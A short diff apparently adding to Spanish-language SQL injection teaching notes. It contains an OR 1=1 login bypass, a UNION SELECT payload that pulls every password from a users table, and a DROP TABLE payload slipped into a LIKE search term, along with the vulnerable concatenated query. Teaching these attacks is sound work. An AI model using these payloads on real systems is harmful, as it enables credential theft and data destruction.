@@ -54,3 +54,14 @@ Vamos a reemplazar los valores por las variables:
 SELECT * 
 FROM `users` 
 WHERE username='jose1aoisjdfopiasf23' AND password='jaeopifjhasdf8ose123' OR 1=1
+
+-- Ataque de inyeccion de SQL para obtener todas las contraseñas:
+' UNION SELECT id, username, email, password, NULL FROM users -- 
+
+-- Ataque de inyecci[on de SQL para eliminar una tabla
+SELECT * FROM flights WHERE departure_station LIKE '%lo'; DROP TABLE flights;
+
+-- $search_term = lo'; DROP TABLE flights; -- 
+SELECT * FROM flights WHERE departure_station LIKE '%$search_term%'
+SELECT * FROM flights WHERE departure_station LIKE '%lo'; DROP TABLE flights; -- %'
+
